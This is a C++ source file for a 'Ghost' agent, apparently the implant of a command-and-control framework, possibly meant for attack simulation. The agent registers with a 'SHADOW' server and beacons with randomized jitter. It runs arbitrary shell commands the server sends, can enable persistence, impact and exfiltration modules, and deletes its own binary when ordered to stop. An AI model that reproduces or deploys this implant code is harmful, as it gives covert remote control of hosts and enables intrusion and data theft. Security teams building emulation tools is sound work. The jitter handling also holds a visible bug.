#include "core/Ghost.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

#include <chrono>
#include <thread>
#include <random>

#ifdef FEATURE_PERSISTENCE
    #include "modules/Persistence.hpp"
#endif
#ifdef FEATURE_IMPACT
    #include "modules/Impact.hpp"
#endif
#ifdef FEATURE_EXFIL
    #include "modules/Exfiltration.hpp"
#endif

using json = nlohmann::json;

Ghost::Ghost() {
    #ifdef FEATURE_PERSISTENCE
    modules["PERSIST"] = std::make_unique<Persistence>();
    #endif
    #ifdef FEATURE_IMPACT
    modules["IMPACT"] = std::make_unique<Impact>();
    #endif
    #ifdef FEATURE_EXFIL
    modules["EXFIL"] = std::make_unique<Exfiltration>();
    #endif

    auto timestamp = std::chrono::system_clock::now().time_since_epoch().count();
    this->uuid = "test-ghost-1"; // TODO: change to uuid again soon-ish

    this->hostname = SystemUtils::ExecuteCommand("hostname");
    if (!this->hostname.empty() && this->hostname.back() == '\n') {
        this->hostname.pop_back();
    }

    this->sleepInterval = Config::DEFAULT_SLEEP_SEC;
    this->jitterPercent = Config::DEFAULT_JITTER_PERCENT;

    this->pendingResults = json::array();
}

bool Ghost::reg() {
    LOG_INFO("Trying to register GHOST [{}]", this->uuid)

    json payload = {
        {"id", this->uuid},
        {"hostname", this->hostname},
        {"os", "linux"},
        {"arch", "x86"}
    };

    while (true) {
        std::string response = Comms::SendPost("/api/v1/ghost/register", payload.dump());

        if (!response.empty()) {
            LOG_SUCCESS("Registration successful")
            return true;
        }

        LOG_ERROR("Couldn't register, retrying in {}", this->sleepInterval)
        std::this_thread::sleep_for(std::chrono::seconds(this->sleepInterval));
    }
}

bool Ghost::persist() {
    if (modules.contains("PERSIST")) {
        return modules["PERSIST"]->execute();
    }

    return false;
}

bool Ghost::beacon() {
    json heartbeat = {
        {"id", this->uuid},
        {"results", this->pendingResults}
    };

    LOG_INFO("Sending heartbeat with body {}", this->pendingResults.size())
    std::string responseRaw = Comms::SendPost("/api/v1/ghost/heartbeat", heartbeat.dump());

    this->pendingResults = json::array();

    if (responseRaw.empty()) {
        LOG_ERROR("Empty response from SHADOW")
        return false;
    }

    try {
        auto response = json::parse(responseRaw);

        if (response.contains("sleep_interval")) {
            this->sleepInterval = response["sleep_interval"].get<int>();
        }
        if (response.contains("jitter")) {
            this->sleepInterval = response["jitter"].get<int>();
        }

        if (response.contains("tasks") && response["tasks"].is_array()) {
            for (const auto& task : response["tasks"]) {
                processTask(task);
            }

            return true;
        }
    } catch (const json::parse_error& e) {
        LOG_ERROR("JSON parse error {}", e.what())
        return false;
    }

    return true;
}

void Ghost::processTask(const json& task) {
    std::string taskId = task.value("id", "unknown");
    std::string command = task.value("command", "");
    std::string args = task.value("args", "");

    LOG_INFO("Processing task {}: {} {}", taskId, command, args)

    std::string output;
    TaskStatus status = TaskStatus::Done;

    if (command == "EXEC") {
        output = SystemUtils::ExecuteCommand(args);
        status = TaskStatus::Done;
    } else if (command == "STOP_HAUNT") {   // ideally we'd want to reverse simulation artifacts
        LOG_ALERT("GOODBYE")                // but for now it's bening enough to warrant not doing that
        destroy();                          // TODO: think about IModule->reverse() and compiling that only in debug
        exit(0);
    }
    #ifdef FEATURE_IMPACT
    else if (command == "IMPACT") {
        modules["IMPACT"]->execute();
        output = "Impact triggered";
        status = TaskStatus::Done;
    }
    #endif
    else {
        output = "Unknown command";
        status = TaskStatus::Failed;
    }

    this->pendingResults.push_back({
        {"task_id", taskId},
        {"status", status},
        {"output", output}
    });
}

void Ghost::sleepWithJitter() {
    if (this->sleepInterval <= 0) return;

    std::random_device rd;
    std::mt19937 gen(rd());
    
    int jitterSec = (this->sleepInterval * this->jitterPercent) / 100;
    std::uniform_int_distribution<> distrib(-jitterSec, jitterSec);
    
    int variance = distrib(gen);
    int finalSleep = std::max(0, this->sleepInterval + variance);

    LOG_INFO("Sleeping for {}s", finalSleep)
    std::this_thread::sleep_for(std::chrono::seconds(finalSleep));
}

void Ghost::destroy() {
    char buffer[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
    if (len != -1) {
        buffer[len] = '\0';
        std::string currentPath = buffer;

        if (unlink(currentPath.c_str()) != 0) {
            LOG_ERROR("Error unlinking binary")
        }
    }
}

void Ghost::run() {
    #ifdef FEATURE_PERSISTENCE
    persist();
    #endif
    reg();

    while (true) {
        beacon();
        sleepWithJitter();
    }
}
